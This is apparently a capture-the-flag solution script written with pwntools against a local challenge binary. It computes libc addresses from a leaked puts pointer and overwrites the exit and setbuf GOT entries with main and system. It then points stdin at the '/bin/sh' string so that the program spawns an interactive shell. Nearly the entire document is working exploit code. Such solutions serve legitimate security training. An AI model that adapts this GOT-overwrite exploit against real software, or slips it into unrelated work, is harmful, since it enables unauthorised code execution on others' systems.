#!/usr/bin/env python3

# Title:        solve.py
# Description:  02 solution
# Author:       bluecosmo

from pwn import *

context.terminal = ["tmux", "splitw", "-h"]
gdbcmds = """
b * main + 251
c
"""

elf = context.binary = ELF("./chall")
p = process(elf.path)
# p = gdb.debug(elf.path, gdbscript=gdbcmds)

# Get libc address
p.recvuntil(b": ")
a_puts = int(p.recv(14).decode(), 16)
a_libc = a_puts - 0x5e380
a_binsh = a_libc + 0x1b1064
a_system = a_libc + 0x2f1e0
a_main = elf.symbols["main"]
a_stdin = 0x404070

exit_got = elf.got["exit"]
setbuf_got = elf.got["setbuf"]

print(f"PUTS: {hex(a_puts)}")
print(f"LIBC: {hex(a_libc)}")

p.sendline(str(a_main).encode())
p.sendline(str(exit_got).encode())

p.sendline(str(a_system).encode())
p.sendline(str(setbuf_got).encode())

p.sendline(str(a_binsh).encode())
p.sendline(str(a_stdin).encode())

p.interactive()
